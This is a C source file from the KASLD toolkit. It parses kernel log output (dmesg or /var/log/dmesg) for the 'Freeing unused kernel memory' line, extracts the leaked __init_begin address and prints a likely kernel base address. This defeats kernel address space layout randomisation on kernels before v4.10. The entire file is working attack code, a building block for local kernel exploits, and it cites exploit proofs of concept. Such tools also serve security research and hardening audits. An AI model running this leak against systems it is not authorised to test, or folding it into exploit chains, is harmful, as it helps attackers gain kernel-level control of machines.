// This file is part of KASLD - https://github.com/bcoles/kasld
//
// free_reserved_area() printed virtual memory layout information to dmesg
// for SMP kernels:
//
// x86:
// Freeing unused kernel memory: 872K (c19b4000 - c1a8e000)
//
// x86_64:
// Freeing unused kernel memory: 1476K (ffffffff81f41000 - ffffffff820b2000)
//
// arm64:
// Freeing initrd memory: 16776K (ffff80005745b000 - ffff8000584bd000)
//
// ppc64:
// Freeing unused kernel memory: 960K (c000000000920000 - c000000000a10000)
//
// Removed in kernel v4.10-rc1 on 2016-10-26:
// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long search_dmesg_free_reserved_area() {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  char *addr_buf;
  const char *needle = "Freeing unused kernel memory";
  int size;
  unsigned long addr = 0;

  printf("[.] searching dmesg for free_reserved_area() info ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  /* Freeing unused kernel memory: 1476K (ffffffff81f41000 - ffffffff820b2000)
   */
  // printf("%s\n", line_buf);

  addr_buf = strstr(line_buf, "(");
  if (addr_buf == NULL)
    return 0;

  addr = strtoul(&addr_buf[1], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

unsigned long search_dmesg_log_file_free_reserved_area() {
  FILE *f;
  char *endptr;
  char *substr;
  char *addr_buf;
  char *line_buf;
  const char *path = "/var/log/dmesg";
  const char *needle = "Freeing unused kernel memory";
  unsigned long addr = 0;
  char buff[BUFSIZ];

  printf("[.] searching %s for free_reserved_area() info ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  while ((fgets(buff, BUFSIZ, f)) != NULL) {
    substr = strstr(buff, needle);
    if (substr == NULL)
      continue;

    line_buf = strtok(substr, "\n");
    if (line_buf == NULL)
      break;

    addr_buf = strstr(line_buf, "(");
    if (addr_buf == NULL)
      break;

    addr = strtoul(&addr_buf[1], &endptr, 16);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  fclose(f);

  return addr;
}

int main() {
  unsigned long addr = search_dmesg_free_reserved_area();
  if (!addr)
    addr = search_dmesg_log_file_free_reserved_area();

  if (!addr)
    return 1;

  printf("leaked __init_begin: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
